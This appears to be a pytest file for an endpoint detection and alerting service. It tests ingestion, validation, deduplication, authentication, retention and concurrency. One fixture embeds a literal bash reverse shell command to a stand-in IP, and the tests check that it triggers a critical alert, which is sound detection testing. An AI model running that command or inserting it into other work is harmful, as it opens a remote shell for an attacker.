"""End-to-end: event -> ingestion -> persistence -> rule -> alert -> incident -> dashboard."""

from __future__ import annotations

from fastapi.testclient import TestClient

from tests.conftest import Api, event, ingest

REVERSE_SHELL = {
    "pid": 7001,
    "ppid": 7000,
    "name": "bash",
    "executable": "/usr/bin/bash",
    "command_line": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
}


def test_event_to_alert_to_dashboard(app_client: TestClient, admin: Api, agent_token: str) -> None:
    benign = event(
        process={"pid": 10, "name": "ls", "executable": "/usr/bin/ls", "command_line": "ls"}
    )
    malicious = event(user={"name": "deploy", "uid": 1001}, process=REVERSE_SHELL)

    response = ingest(app_client, agent_token, [benign, malicious])
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["accepted"] == 2
    assert body["duplicates"] == 0
    assert body["rejected"] == []

    events = admin.get("/api/v1/events").json()
    assert events["total"] == 2

    alerts = admin.get("/api/v1/alerts").json()
    assert alerts["total"] == 1
    alert = alerts["items"][0]
    assert alert["rule_id"] == "aegis-lnx-reverse-shell"
    assert alert["severity"] == "critical"
    assert "T1059.004" in alert["attack_techniques"]
    assert alert["hostname"] == "host-a"

    detail = admin.get(f"/api/v1/alerts/{alert['id']}").json()
    assert [e["id"] for e in detail["events"]] == [malicious["event_id"]]
    assert detail["rule"]["rule_id"] == "aegis-lnx-reverse-shell"

    # critical alerts open an incident automatically
    incidents = admin.get("/api/v1/incidents").json()
    assert incidents["total"] == 1
    assert incidents["items"][0]["severity"] == "critical"
    assert alert["incident_id"] == incidents["items"][0]["id"]

    dashboard = admin.get("/api/v1/dashboard").json()
    metrics = {m["key"]: m["value"] for m in dashboard["metrics"]}
    assert metrics["endpoints"] == 1
    assert metrics["open_alerts"] == 1
    assert metrics["events_period"] == 2
    assert dashboard["alerts_by_severity"] == {"critical": 1}
    assert all(m["definition"] and m["source"] for m in dashboard["metrics"])


def test_resent_events_are_deduplicated(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    malicious = event(process=REVERSE_SHELL)
    first = ingest(app_client, agent_token, [malicious]).json()
    second = ingest(app_client, agent_token, [malicious, malicious]).json()
    assert first["accepted"] == 1
    assert second == {**second, "accepted": 0, "duplicates": 2}
    assert admin.get("/api/v1/events").json()["total"] == 1
    alerts = admin.get("/api/v1/alerts").json()["items"]
    assert len(alerts) == 1 and alerts[0]["hit_count"] == 1


def test_invalid_events_are_rejected_individually(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    good = event()
    missing_process = event()
    del missing_process["process"]
    wrong_action = event(action="explode")
    bad_ip = event(
        category="network",
        action="connect",
        network={
            "direction": "outbound",
            "protocol": "tcp",
            "src_ip": "10.0.0.1",
            "src_port": 1,
            "dst_ip": "not-an-ip",
            "dst_port": 80,
        },
    )
    naive_time = event()
    naive_time["occurred_at"] = "2026-01-01T00:00:00"
    future = event()
    future["occurred_at"] = "2099-01-01T00:00:00+00:00"
    extra_field = event()
    extra_field["unexpected"] = True
    response = ingest(
        app_client,
        agent_token,
        [good, missing_process, wrong_action, bad_ip, naive_time, future, extra_field, "garbage"],
    )
    body = response.json()
    assert response.status_code == 200
    assert body["accepted"] == 1
    assert sorted(r["index"] for r in body["rejected"]) == [1, 2, 3, 4, 5, 6, 7]
    assert any("future" in r["reason"] for r in body["rejected"])


def test_ingest_requires_valid_agent_token(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    assert ingest(app_client, "aga_wrong", [event()]).status_code == 401
    no_auth = app_client.post("/api/v1/ingest/events", json={"events": [event()]})
    assert no_auth.status_code == 401
    # a user session token is not an agent token
    agents = admin.get("/api/v1/agents").json()
    assert admin.post(f"/api/v1/agents/{agents[0]['id']}/revoke").status_code == 200
    assert ingest(app_client, agent_token, [event()]).status_code == 401


def test_agent_cannot_spoof_another_host(app_client: TestClient, agent_token: str) -> None:
    assert ingest(app_client, agent_token, [event(hostname="host-a")]).json()["accepted"] == 1
    spoofed = ingest(app_client, agent_token, [event(hostname="host-b")]).json()
    assert spoofed["accepted"] == 0
    assert "bound to host" in spoofed["rejected"][0]["reason"]


def test_out_of_order_events_are_accepted(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    from datetime import UTC, datetime, timedelta

    now = datetime.now(UTC)
    late = event(occurred_at=now - timedelta(minutes=30))
    early = event(occurred_at=now - timedelta(minutes=1))
    assert ingest(app_client, agent_token, [early]).json()["accepted"] == 1
    assert ingest(app_client, agent_token, [late]).json()["accepted"] == 1
    items = admin.get("/api/v1/events").json()["items"]
    assert [i["id"] for i in items] == [early["event_id"], late["event_id"]]


def test_batch_limits(app_client: TestClient, agent_token: str) -> None:
    too_many = [event() for _ in range(501)]
    assert ingest(app_client, agent_token, too_many).status_code == 422
    assert ingest(app_client, agent_token, []).status_code == 422
    response = app_client.post(
        "/api/v1/ingest/events",
        content=b"{not json",
        headers={"authorization": f"Bearer {agent_token}", "content-type": "application/json"},
    )
    assert response.status_code == 400


def test_retention_keeps_evidence(app_client: TestClient, admin: Api, agent_token: str) -> None:
    from datetime import UTC, datetime, timedelta

    from aegis.db import session_factory
    from aegis.models import Event
    from aegis.services.retention import purge

    old = datetime.now(UTC) - timedelta(days=5)
    benign = event(occurred_at=old)
    evidence = event(occurred_at=old, process=REVERSE_SHELL)
    assert ingest(app_client, agent_token, [benign, evidence]).json()["accepted"] == 2
    with session_factory()() as db:
        result = purge(db, days=1)
        remaining = {str(e.id) for e in db.query(Event).all()}
    assert result["events"] == 1
    assert remaining == {evidence["event_id"]}


def test_concurrent_first_batches_from_one_host(
    app_client: TestClient, admin: Api, agent_token: str
) -> None:
    """Regression: parallel first batches used to race on endpoint creation (HTTP 500)."""
    from concurrent.futures import ThreadPoolExecutor

    def send(_: int) -> int:
        client = TestClient(app_client.app, base_url="http://testserver")
        return int(ingest(client, agent_token, [event(hostname="race-host")]).status_code)

    with ThreadPoolExecutor(max_workers=6) as pool:
        statuses = list(pool.map(send, range(6)))
    assert statuses == [200] * 6
    endpoints = [e for e in admin.get("/api/v1/endpoints").json() if e["hostname"] == "race-host"]
    assert len(endpoints) == 1
